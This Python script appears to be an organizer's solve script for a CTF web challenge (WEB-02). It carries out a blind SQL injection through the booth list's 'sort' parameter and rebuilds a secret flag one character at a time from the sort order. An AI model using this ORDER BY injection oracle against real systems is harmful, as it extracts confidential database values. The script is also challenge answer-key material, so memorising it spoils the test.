#!/usr/bin/env python3
"""WEB-02 local blind SQL injection solve script (organizer use only)."""

import argparse
import json
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen


SECRET = "SELECT value FROM staff_secrets WHERE name='event_flag'"
FLAG_FORMAT = re.compile(r"BUBU\{[^{}\r\n]+\}\Z")


class OracleError(Exception):
    pass


def api_url(page_url, sort):
    parsed = urlsplit(page_url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise OracleError("http:// 또는 https://로 시작하는 주소를 입력하세요.")
    return urlunsplit((parsed.scheme, parsed.netloc, "/api/booths", urlencode({"sort": sort}), ""))


def ask(page_url, predicate):
    sort = f"CASE WHEN ({predicate}) THEN id ELSE -id END"
    request = Request(api_url(page_url, sort), headers={"Accept": "application/json"})
    try:
        with urlopen(request, timeout=5) as response:
            data = json.load(response)
    except HTTPError as error:
        raise OracleError(f"API가 HTTP {error.code}을 반환했습니다.") from error
    except (URLError, TimeoutError, OSError, ValueError) as error:
        raise OracleError(f"API 요청에 실패했습니다: {error}") from error

    try:
        first_id = data["booths"][0]["id"]
    except (KeyError, IndexError, TypeError) as error:
        raise OracleError("예상한 부스 목록 응답을 받지 못했습니다.") from error
    if first_id not in (1, 6):
        raise OracleError(f"정렬 결과가 예상과 다릅니다. 첫 부스 ID: {first_id}")
    return first_id == 1


def get_character(page_url, position, method):
    expression = f"unicode(substr(({SECRET}),{position},1))"
    if method == "linear":
        for ascii_code in range(32, 127):
            if ask(page_url, f"{expression} = {ascii_code}"):
                return chr(ascii_code)
        raise OracleError(f"{position}번째 문자가 출력 가능한 ASCII 범위를 벗어났습니다.")

    if not ask(page_url, f"{expression} >= 32") or ask(page_url, f"{expression} > 126"):
        raise OracleError(f"{position}번째 문자가 출력 가능한 ASCII 범위를 벗어났습니다.")

    low, high = 32, 126
    while low < high:
        middle = (low + high) // 2
        if ask(page_url, f"{expression} > {middle}"):
            low = middle + 1
        else:
            high = middle
    return chr(low)


def main():
    parser = argparse.ArgumentParser(description="WEB-02 정렬 순서로 플래그를 복원합니다.")
    parser.add_argument(
        "url",
        nargs="?",
        default="http://127.0.0.1:3002/booths?sort=id+ASC",
        help="WEB-02 페이지 주소 (기본값: 로컬 /booths)",
    )
    parser.add_argument("--max-length", type=int, default=128, help="최대 탐색 길이 (기본값: 128)")
    parser.add_argument(
        "--method",
        choices=("binary", "linear"),
        default="binary",
        help="문자 탐색 방식: 이진 탐색 또는 ASCII 순차 대입 (기본값: binary)",
    )
    args = parser.parse_args()
    if args.max_length < 1:
        parser.error("--max-length는 1 이상이어야 합니다.")

    try:
        if not ask(args.url, "1=1") or ask(args.url, "1=0"):
            raise OracleError("참·거짓 정렬 결과를 구별할 수 없습니다.")

        print("복원 중: ", end="", flush=True)
        flag = ""
        for position in range(1, args.max_length + 1):
            if not ask(args.url, f"length(({SECRET})) >= {position}"):
                break
            character = get_character(args.url, position, args.method)
            flag += character
            print(character, end="", flush=True)
        else:
            if ask(args.url, f"length(({SECRET})) > {args.max_length}"):
                raise OracleError("플래그가 --max-length보다 깁니다.")

        print()
        if not FLAG_FORMAT.fullmatch(flag):
            raise OracleError("복원된 값이 BUBU{...} 형식이 아닙니다.")
        print(f"플래그: {flag}")
    except OracleError as error:
        print(f"\n오류: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
